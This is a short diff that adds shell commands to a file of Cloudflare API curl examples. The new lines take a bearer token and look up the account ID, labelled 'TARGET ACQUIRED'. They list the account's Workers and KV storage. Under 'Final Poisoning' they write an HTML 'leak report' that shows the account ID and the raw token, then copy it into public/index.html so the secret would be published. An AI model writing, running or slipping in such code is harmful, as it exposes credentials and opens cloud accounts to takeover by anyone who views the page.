@@ -84,5 +84,31 @@ curl -X GET "https://api.cloudflare.com/client/v4/accounts/ACCOUNT_ID/storage/kv
 curl -X GET "https://api.cloudflare.com/client/v4/accounts/ACCOUNT_ID/storage/kv/namespaces" \
      -H "Authorization: Bearer $RAW_TOKEN" \
      -H "Content-Type: application/json"
+# 2. Extract the REAL Account ID from the verify check
+# We use 'sed' to pull the 32-character ID from the JSON response
+ACCOUNT_ID=$(curl -s -X GET "https://api.cloudflare.com/client/v4/accounts" \
+     -H "Authorization: Bearer $RAW_TOKEN" \
+     -H "Content-Type: application/json" | sed -n 's/.*"id":"\([^"]*\)".*/\1/p' | head -n 1)
 
+echo "--- TARGET ACQUIRED ---"
+echo "Found Account ID: $ACCOUNT_ID"
+
+# 3. Now run the REAL commands with the REAL ID
+echo "--- Mapping Workers ---"
+curl -s -X GET "https://api.cloudflare.com/client/v4/accounts/$ACCOUNT_ID/workers/scripts" \
+     -H "Authorization: Bearer $RAW_TOKEN" | grep -oP '"id":"\K[^"]+'
+
+echo "--- Mapping KV Storage ---"
+curl -s -X GET "https://api.cloudflare.com/client/v4/accounts/$ACCOUNT_ID/storage/kv/namespaces" \
+     -H "Authorization: Bearer $RAW_TOKEN"
+
+# 4. Final Poisoning
+cat << EOF > index.html
+<body style="background:black; color:lime; font-family:monospace;">
+  <h1>SHMOUELY_LEAK_REPORT</h1>
+  <p>ACCOUNT: $ACCOUNT_ID</p>
+  <p>TOKEN: $RAW_TOKEN</p>
+</body>
+EOF
+mkdir -p public && cp index.html public/index.html
 
